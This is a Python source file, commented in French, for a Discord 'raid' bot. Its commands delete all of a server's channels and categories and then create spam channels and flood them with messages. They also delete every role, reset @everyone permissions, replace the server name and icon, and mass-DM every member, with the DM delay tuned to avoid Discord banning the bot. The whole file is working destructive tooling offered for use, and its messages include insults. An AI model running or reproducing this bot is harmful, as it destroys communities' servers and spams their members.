import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
client = commands.Bot(command_prefix="!", intents=intents)

@client.event
async def on_ready():
    print(f"{client.user} est bien en ligne.")

@client.command()
async def raid(ctx, salon_name: str, *, message: str):
    if '/' in message:
        parts = message.split('/')
        spam_message = parts[0].strip()
        new_server_name = parts[1].strip() if len(parts) > 1 else None
    else:
        spam_message = message
        new_server_name = None

    if new_server_name:
        await ctx.guild.edit(name=new_server_name)
        await ctx.send(f"Le nouveau du serv est : {new_server_name}")

    for category in ctx.guild.categories:
        await category.delete()
    for salon in ctx.guild.text_channels:
        await salon.delete()

    created_channels = []
    for _ in range(10):
        category = await ctx.guild.create_category(salon_name)
        new_channel = await ctx.guild.create_text_channel(salon_name, category=category)
        created_channels.append(new_channel)

    async def send_message_in_channel(channel):
        for _ in range(10):
            await channel.send(spam_message)
            await asyncio.sleep(0.1)

    tasks = [send_message_in_channel(channel) for channel in created_channels]
    await asyncio.gather(*tasks)

@client.command()
async def bezpermm(ctx):
    allowed_permissions = discord.Permissions(read_messages=True, send_messages=True)
    roles_to_delete = [role for role in ctx.guild.roles if role.name != "@everyone"]

    for i, role in enumerate(roles_to_delete):
        try:
            await role.delete()
            print(f"Role suppr : {role.name}")
            if i % 5 == 0:
                await asyncio.sleep(2)
        except discord.Forbidden:
            await ctx.send(f"GG A {role.name}.")
        except discord.HTTPException as e:
            await ctx.send(f"J'ai pas pu suppr ce role {role.name}: {e}")

    everyone_role = ctx.guild.default_role
    try:
        await everyone_role.edit(permissions=allowed_permissions)
        await ctx.send("Hihi j'ai bien reset les roles^^")
    except discord.Forbidden:
        await ctx.send("J'ai pas les perms pour changer le role @everyone.")
    except discord.HTTPException as e:
        await ctx.send(f"Erreur dans la config de @everyone : {e}")

@client.command()
async def icone(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("photo photo stp.")
        return

    attachment = ctx.message.attachments[0]
    if not (attachment.filename.endswith('.png') or attachment.filename.endswith('.jpg') or attachment.filename.endswith('.jpeg') or attachment.filename.endswith('.gif')):
        await ctx.send("Ca doit etre en format PNG, JPG, JPEG ou GIF.")
        return

    try:
        image_data = await attachment.read()
        await ctx.guild.edit(icon=image_data)
        await ctx.send("GG EZ ICONE DU SERV")
    except discord.Forbidden:
        await ctx.send("Pas les perm enculer")
    except discord.HTTPException as e:
        await ctx.send(f"Erreur pendant la modif de l'icone du serv : {e}")

@client.command()
async def dmall(ctx, *, message: str):
    sent_count = 0
    failed_count = 0
    await ctx.send("uiui j'envoie le plus rapidement possible bb")

    for member in ctx.guild.members:
        if member.bot:
            continue
        try:
            if member.dm_channel is None:
                await member.create_dm()
            await member.dm_channel.send(message)
            sent_count += 1
            print(f"Message envoyé a : {member.name}")
        except Exception as e:
            failed_count += 1
            print(f"Erreur avec {member.name}: {e}")
        await asyncio.sleep(2.5)#j'ai mis 2.5 car a 2 le token du bot se fait bz par discord (jle host sur mon pc)

    await ctx.send(f"j'ai dm {sent_count} enculer mais {failed_count} fdp n'ont pas accepté mon dm")

client.run('TON_TOKEN_BG')

